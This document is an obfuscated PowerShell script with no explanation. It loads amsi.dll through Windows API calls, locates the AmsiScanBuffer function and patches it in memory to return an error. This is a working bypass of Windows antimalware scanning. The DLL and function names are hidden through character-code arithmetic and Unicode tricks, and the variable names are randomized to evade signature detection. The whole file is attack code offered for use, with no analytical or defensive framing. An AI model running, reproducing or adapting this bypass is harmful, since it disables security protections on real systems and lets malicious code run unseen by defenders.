$Sy_v2P0H01sf0sEP = @"
using System;
using System.Runtime.InteropServices;
public class Sy_v2P0H01sf0sEP {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr NBiR, string JvS);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr uUZwYtT3jZBpg9, UIntPtr R7BBsO1yd5f0_IA, uint t84emCs6K2Yw, out uint cVRcAQDrHT0LJ1FLgpx);
}
"@

Add-Type $Sy_v2P0H01sf0sEP

$ymgkR_Uef3hrgwd = [Sy_v2P0H01sf0sEP]::LoadLibrary("$(('â'+'m'+'s'+'ì'+'.'+'d'+'l'+'l').nORmaLIzE([cHaR]([bYTe]0x46)+[cHar](111+52-52)+[ChaR](114*42/42)+[cHaR](63+46)+[cHaR]([ByTe]0x44)) -replace [ChaR](92)+[ChAR]([byTe]0x70)+[cHAR]([bytE]0x7b)+[cHAr](77*56/56)+[chaR](110)+[chAR]([BYTe]0x7d))")
$wHlfGr1zqEyZRACe2Z = [Sy_v2P0H01sf0sEP]::GetProcAddress($ymgkR_Uef3hrgwd, "$([chaR]([ByTE]0x41)+[ChAr](109)+[cHAr](115)+[char](105)+[chAr]([BYTE]0x53)+[cHar](99)+[ChAr]([byTE]0x61)+[Char]([bYtE]0x6e)+[CHar]([byTe]0x42)+[ChAr]([Byte]0x75)+[cHAR]([Byte]0x66)+[cHar](102+62-62)+[cHAr]([ByTE]0x65)+[ChaR](114+9-9))")
$p = 0
[Sy_v2P0H01sf0sEP]::VirtualProtect($wHlfGr1zqEyZRACe2Z, [uint32]5, 0x40, [ref]$p)
$voClS6 = "0xB8"
$QFgqRuDSVPV = "0x57"
$n91YK3Y = "0x00"
$XjyQZMkEge_ = "0x07"
$VrZjdhgm8 = "0x80"
$GXIdMDvs = "0xC3"
$C35M5J4mmCS = [Byte[]] ($voClS6,$QFgqRuDSVPV,$n91YK3Y,$XjyQZMkEge_,+$VrZjdhgm8,+$GXIdMDvs)
[System.Runtime.InteropServices.Marshal]::Copy($C35M5J4mmCS, 0, $wHlfGr1zqEyZRACe2Z, 6)